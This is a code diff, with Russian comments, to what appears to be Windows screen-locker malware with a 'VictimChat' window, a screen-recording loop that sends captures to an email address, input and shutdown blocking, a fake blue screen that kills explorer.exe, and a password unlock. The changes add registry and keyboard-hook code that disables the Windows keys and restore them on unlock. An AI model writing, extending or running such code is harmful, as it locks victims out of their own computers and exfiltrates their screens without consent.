@@ -41,6 +41,16 @@ RECEIVER_EMAIL = "xzx78848@gmail.com"
 
 attempts_left = MAX_ATTEMPTS
 
+# ========== ВОССТАНОВЛЕНИЕ WIN ==========
+def restore_win_key():
+    try:
+        import winreg
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, "NoWinKeys", 0, winreg.REG_DWORD, 0)
+        winreg.CloseKey(key)
+    except:
+        pass
+
 # ========== ЗАПИСЬ ЭКРАНА ==========
 def record_and_send_loop():
     while True:
@@ -133,11 +143,9 @@ class VictimChat:
         self.chat_window.grab_set()
         self.chat_window.protocol("WM_DELETE_WINDOW", self.hide)
         
-        # Рамка
         frame = tk.Frame(self.chat_window, bg='black', bd=2, relief='solid')
         frame.pack(fill='both', expand=True, padx=2, pady=2)
         
-        # Заголовок
         header = tk.Frame(frame, bg='#00FF00')
         header.pack(fill='x')
         
@@ -149,7 +157,6 @@ class VictimChat:
                              bd=0, width=3, cursor='hand2')
         close_btn.pack(side='right', padx=5, pady=3)
         
-        # История сообщений
         self.chat_history = scrolledtext.ScrolledText(frame, 
                                                        bg='#0a0a0a', fg='#00FF00',
                                                        font=('Courier', 10), height=22,
@@ -157,7 +164,6 @@ class VictimChat:
         self.chat_history.pack(padx=10, pady=(0, 5), fill='both', expand=True)
         self.chat_history.config(state='disabled')
         
-        # Поле ввода
         input_frame = tk.Frame(frame, bg='black')
         input_frame.pack(padx=10, pady=(0, 10), fill='x')
         
@@ -172,7 +178,6 @@ class VictimChat:
                             width=3, cursor='hand2', relief='solid', bd=1)
         send_btn.pack(side='right', padx=(5, 0))
         
-        # Перетаскивание окна
         header.bind('<Button-1>', self.start_drag)
         header.bind('<B1-Motion>', self.drag)
         
@@ -375,6 +380,15 @@ def block_input(block=True):
 # ========== БЛОКИРОВКА ВСЕХ КЛАВИШ ==========
 def block_all_keys():
     try:
+        # Отключаем Win через реестр
+        try:
+            import winreg
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(key, "NoWinKeys", 0, winreg.REG_DWORD, 1)
+            winreg.CloseKey(key)
+        except:
+            pass
+        
         import keyboard
         all_combos = [
             'alt+f4', 'alt+tab', 'alt+esc', 'alt+space',
@@ -383,13 +397,22 @@ def block_all_keys():
             'win', 'win+d', 'win+r', 'win+e', 'win+l',
             'win+m', 'win+tab', 'win+x', 'win+u',
             'alt', 'ctrl', 'shift', 'f11',
-            'print screen', 'alt+print screen'
+            'print screen', 'alt+print screen',
+            'left windows', 'right windows'
         ]
         for combo in all_combos:
             try:
                 keyboard.add_hotkey(combo, lambda: None, suppress=True, timeout=0)
             except:
                 pass
+        
+        try:
+            keyboard.block_key('windows')
+            keyboard.block_key('left windows')
+            keyboard.block_key('right windows')
+        except:
+            pass
+        
         block_keys = ['f1','f2','f3','f4','f5','f6','f7','f8','f9','f10','f11','f12',
                      'print screen','scroll lock','pause']
         for key in block_keys:
@@ -428,6 +451,7 @@ def prevent_shutdown():
 # ========== СИНИЙ ЭКРАН СМЕРТИ ==========
 def show_bsod():
     try:
+        restore_win_key()
         os.system("taskkill /f /im explorer.exe >nul 2>&1")
         bsod = tk.Tk()
         bsod.attributes('-fullscreen', True)
@@ -620,6 +644,7 @@ $1$rjBkQ1jG$TTNuUVgVfun06nsscdMUV1
         global attempts_left
         
         if self.entry.get() == PASSWORD:
+            restore_win_key()
             self.status.config(text="ВЕРНО! РАЗБЛОКИРОВКА...", fg='#00FF00')
             self.win.update()
             time.sleep(1)
